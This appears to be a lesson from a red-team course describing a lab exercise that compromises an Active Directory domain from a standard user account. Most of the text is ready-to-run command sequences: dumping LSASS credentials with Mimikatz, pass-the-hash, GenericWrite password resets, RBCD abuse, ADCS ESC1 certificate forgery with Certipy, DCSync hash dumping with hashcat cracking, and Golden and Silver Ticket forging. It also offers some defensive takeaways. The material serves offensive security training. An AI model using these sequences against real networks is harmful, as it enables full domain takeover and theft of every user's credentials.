---
title: "Offshore Lab Episode 3 — Active Directory Domain Compromise"
tags: [red-team, offshore, lab, active-directory, domain-compromise, bloodhound,
  dcsync, golden-ticket, ADCS, kerberos, lateral-movement, T1003.006,
  T1558.001, T1484, ATT&CK]
module: 08-RedTeam-03
day: 537
related_topics:
  - Offshore Lab Episode 2 (Day 536)
  - Offshore Lab Episode 4 (Day 538)
  - Domain Dominance (Day 499)
  - ADCS ESC1 Lab (Day 512)
  - RBCD Attack (Day 514)
  - BloodHound and AD Attack Paths (Day 501)
---

# Day 537 — Offshore Lab Episode 3: Active Directory Domain Compromise

> "Every AD environment has a path to Domain Admin. The question is not whether
> the path exists — it always does. The question is how long the path is and
> how loud walking it will be. BloodHound showed you the map. Now you navigate
> it with precision. One step at a time, no unnecessary noise, no detours."
>
> — Ghost

---

## Goals

Execute the BloodHound-identified attack path from a standard domain user
to Domain Admin privileges.
Achieve domain-wide credential access via DCSync.
Generate a Golden Ticket for offline access without further exploitation.
Achieve domain compromise via at least one ADCS path if ADCS is present.
Stage for cross-forest and cloud pivots (Episode 4).

**Prerequisites:** Episode 2 complete (BloodHound graph, second C2 beacon on
internal host, at least one set of valid domain credentials).
**Time budget:** 5 hours.

---

## Phase 1 — BloodHound Attack Path Analysis (30 min)

```
Before running any exploit, review your BloodHound graph.
The attack path will be one of these common patterns:

Pattern A — Direct DA path (lucky):
  User → Local Admin on WKS → Admin user logged on WKS → DA
  (User can access workstation, admin is logged in → steal token or hash)

Pattern B — ADCS path:
  User → Enroll permission on vulnerable cert template → Forge DA cert → DA
  (Requires ADCS present and misconfigured template)

Pattern C — Kerberoasted service account with privileged access:
  Cracked service account → Local admin on server → Dump credentials →
  Privileged account → DA path

Pattern D — GenericWrite / AllExtendedRights abuse:
  User has GenericWrite on another user → Change their password →
  Authenticate as that user → Follow their path to DA

Pattern E — Resource-Based Constrained Delegation (RBCD):
  User has GenericWrite on a computer object → Set RBCD →
  S4U2Self + S4U2Proxy → Admin ticket for that computer →
  Hop to DA via that computer's access

Review your graph:
  Chosen attack path: _________________________________________
  Reason (shorter, less noisy, available tools):
  __________________________________________________________
```

---

## Phase 2 — Lateral Movement to Privileged Position (60 min)

### If Following a Workstation Token Theft Path

```powershell
# You have local admin on WKS-01 (10.10.10.20) via CME
# A domain admin is logged in (BloodHound LoggedOn shows this)

# Step 1: Get local admin on WKS-01 via WMI or WinRM
proxychains evil-winrm -i 10.10.10.20 \
    -u corp\\discovered_user -p 'cracked_pass'

# Step 2: Find the DA process (their session is active)
# Inside the evil-winrm session:
Get-Process -IncludeUserName | Where-Object { $_.UserName -match 'DA_user' }

# Step 3: Run Mimikatz to dump the DA's credentials from LSASS
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Look for the DA's NTLM hash or cleartext password

# Step 4: If no cleartext — use pass-the-hash directly
proxychains impacket-wmiexec -hashes :<DA_NTLM_HASH> \
    corp.local/da_user@10.10.10.10  # DC IP
```

### If Following GenericWrite Abuse Path

```powershell
# BloodHound shows: discovered_user has GenericWrite on target_user
# target_user has a path to Domain Admin

# Step 1: Change target_user's password (requires GenericWrite)
proxychains impacket-changepasswd \
    corp.local/discovered_user:'pass'@<DC_IP> \
    -newpasswd 'NewPassword1!' \
    -targusername target_user

# Step 2: Authenticate as target_user
proxychains crackmapexec smb <TARGET> \
    -u target_user -p 'NewPassword1!'

# Step 3: Follow target_user's BloodHound path to DA
```

### If Following RBCD Path

```bash
# BloodHound shows: discovered_user has GenericWrite on WKS-01

# Step 1: Create a fake computer account (standard domain user can do this
#         if ms-DS-MachineAccountQuota > 0, default is 10)
proxychains impacket-addcomputer \
    corp.local/discovered_user:'pass' -dc-ip <DC_IP> \
    -computer-name 'FakeComputer$' -computer-pass 'FakePass123!'

# Step 2: Set RBCD — write FakeComputer$ into WKS-01's
#         msDS-AllowedToActOnBehalfOf attribute
proxychains impacket-rbcd \
    corp.local/discovered_user:'pass' \
    -dc-ip <DC_IP> \
    -action write \
    -delegate-to 'WKS-01$' \
    -delegate-from 'FakeComputer$'

# Step 3: Get a service ticket for WKS-01 impersonating a DA (S4U2Proxy)
proxychains impacket-getST \
    corp.local/FakeComputer$:'FakePass123!' \
    -spn cifs/WKS-01.corp.local \
    -impersonate administrator \
    -dc-ip <DC_IP>

# Step 4: Use the ticket
export KRB5CCNAME=administrator.ccache
proxychains impacket-wmiexec -k -no-pass \
    corp.local/administrator@WKS-01.corp.local
```

---

## Phase 3 — ADCS Exploitation (if ADCS is present) (60 min)

```bash
# Step 1: Enumerate ADCS — find the CA server and vulnerable templates
proxychains certipy find \
    -u discovered_user -p 'pass' -target <DC_IP> \
    -json -output certipy_results

# Certipy identifies:
# - Certificate Authority (CA) name and server
# - Vulnerable templates (ESC1–ESC8)
# Look for: "vulnerable to: ESC1" in output

# Step 2: ESC1 exploitation — Request cert with alternative UPN (DA's UPN)
# ESC1 requires: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT in template + allow enroll
proxychains certipy req \
    -u discovered_user -p 'pass' \
    -ca 'corp-CA' \
    -target <CA_SERVER_IP> \
    -template 'VulnerableTemplate' \
    -upn 'administrator@corp.local' \
    -out admin_cert

# Step 3: Authenticate with the forged cert → get DA's NTLM hash
proxychains certipy auth \
    -pfx admin_cert.pfx \
    -dc-ip <DC_IP>

# Output: NTLM hash for administrator → use for DCSync or PTH

# Step 4: If ESC8 (PetitPotam relay to AD CS web enrollment):
# (covered in Day 513 — reference that lab for the relay setup)
```

---

## Phase 4 — DCSync and Golden Ticket (60 min)

### DCSync — Dump All Domain Credentials

```bash
# DCSync simulates a Domain Controller replication request
# Requires: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All rights
# Typically: only DAs and domain controllers have these rights by default

# From a DA session or using DA credentials:
proxychains impacket-secretsdump \
    corp.local/administrator:'DA_password'@<DC_IP> \
    -just-dc-ntlm \
    -outputfile domain_hashes

# Output: all domain user NTLM hashes
# Critical hashes to save:
# - krbtgt  → Golden Ticket key
# - CORP$   → machine account (useful for DPAPI)
# - All admin accounts

# Identify the krbtgt hash in the output:
grep "krbtgt" domain_hashes.ntds

# Save all hashes for later cracking
hashcat -m 1000 domain_hashes.ntds \
    /usr/share/wordlists/rockyou.txt --force
```

### Golden Ticket Generation

```bash
# Golden Ticket: a forged TGT signed with the krbtgt hash
# Valid for any user in the domain
# Does not require network access to generate or use

# Requires:
# - krbtgt NTLM hash (from DCSync)
# - Domain SID (from impacket output or whoami /all on a domain machine)
# - Target username

# Get domain SID:
proxychains impacket-lookupsid corp.local/administrator:'pass'@<DC_IP> | \
    grep "Domain SID"

# Generate Golden Ticket (Impacket):
proxychains impacket-ticketer \
    -nthash <KRBTGT_NTLM_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain corp.local \
    administrator

# Use the ticket:
export KRB5CCNAME=administrator.ccache
proxychains impacket-psexec \
    corp.local/administrator@dc01.corp.local -k -no-pass

# Verify SYSTEM shell on DC:
whoami
```

### Silver Ticket (Optional — Stealthier)

```bash
# Silver Ticket: forged TGS for a specific service
# Signed with the service account's NTLM hash (not krbtgt)
# Advantage: does not contact the KDC at use time → no DC event logged

# Example: forge a CIFS ticket for accessing \\FILESERVER\ shares
proxychains impacket-ticketer \
    -nthash <FILESERVER$_NTLM_HASH> \
    -domain-sid <DOMAIN_SID> \
    -domain corp.local \
    -spn cifs/fileserver.corp.local \
    -user-id 500 \
    administrator

export KRB5CCNAME=administrator.ccache
proxychains impacket-smbclient \
    corp.local/administrator@fileserver.corp.local -k -no-pass
```

---

## Phase 5 — Objective Access and Evidence Collection

```bash
# With DA access, collect all required proofs for the engagement

# Standard domain admin proof:
proxychains impacket-wmiexec \
    corp.local/administrator:'DA_pass'@<DC_IP>
> type C:\Users\Administrator\Desktop\proof.txt  # or equivalent flag file

# Evidence checklist:
# ☐ Screenshot: whoami on DC (shows corp\administrator or CORP\Administrator)
# ☐ Screenshot: domain SID confirmation
# ☐ Screenshot: DCSync output showing krbtgt hash captured
# ☐ Screenshot: Golden Ticket generated and used successfully
# ☐ Screenshot: access to any "crown jewel" file/database specified in scope

# Document all accessed hosts, credentials used, techniques:
echo "DA achieved via: [technique]" >> engagement_notes.txt
echo "DC IP: <DC_IP>" >> engagement_notes.txt
echo "Domain: corp.local" >> engagement_notes.txt
echo "DA hash: <NTLM_HASH>" >> engagement_notes.txt
echo "krbtgt hash: <KRBTGT_NTLM>" >> engagement_notes.txt
```

---

## Episode 3 Completion Checklist

```
BloodHound:
  ☐ Attack path executed matches BloodHound-identified path
  ☐ No unplanned hops (every step was pre-mapped)

Domain Compromise:
  ☐ Domain Admin access achieved
  ☐ DCSync executed successfully — domain_hashes.ntds obtained
  ☐ krbtgt NTLM hash captured and recorded
  ☐ Golden Ticket generated and tested

ADCS (if applicable):
  ☐ Certipy find output reviewed — vulnerable templates documented
  ☐ ESC1 or ESC8 exploited (if present) → DA cert obtained

Evidence:
  ☐ Screenshot: whoami /all on DC confirming DA
  ☐ Screenshot: proof.txt or equivalent flag
  ☐ All credentials documented: plaintext, hashes, source host

Operational status:
  ☐ C2 beacon still active on at least one internal host
  ☐ All pivots still functional
  ☐ Ready to stage Episode 4 (multi-forest / cloud pivot)
```

---

## Key Takeaways

1. The BloodHound attack path is the script for domain compromise. Deviating
   from the mapped path wastes time and increases noise. Map first, then execute
   the precise path you identified — step by step, no guessing.
2. DCSync requires only DS-Replication rights, not direct access to the DC.
   Any account with those rights (typically DAs plus any misconfigured
   delegated accounts) can dump the entire domain password database without
   touching the DC's file system. BloodHound's "Principals with DCSync Rights"
   query reveals these accounts.
3. The Golden Ticket persists even after the krbtgt password is rotated once.
   To invalidate a Golden Ticket, the krbtgt password must be rotated twice.
   Most organisations only rotate it once during incident response, leaving
   existing Golden Tickets valid. This is why the krbtgt hash is the most
   valuable artefact in a domain compromise.
4. ADCS is present in most enterprise environments (it is the standard Windows
   PKI). ESC1 through ESC8 affect the certificate template configuration, not
   ADCS itself — which means remediation requires template reconfiguration,
   not patching. Many organisations have had these misconfigurations for years
   before Certipy made them visible.
5. All Kerberos ticket attacks (Golden, Silver, S4U, RBCD) operate at the
   Kerberos protocol layer. They are not OS exploits — they are protocol-level
   attacks that abuse legitimate Kerberos flows with stolen key material.
   Understanding this explains why changing a user's password does not
   invalidate their existing tickets.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q537.1, Q537.2 …).

---

## Navigation

← Previous: [Day 536 — Offshore Lab Episode 2: Internal Pivoting](DAY-0536-Offshore-Lab-Episode-2-Internal-Pivoting.md)
→ Next: [Day 538 — Offshore Lab Episode 4: Multi-Forest Trust Exploitation](DAY-0538-Offshore-Lab-Episode-4-Multi-Forest-Trust.md)
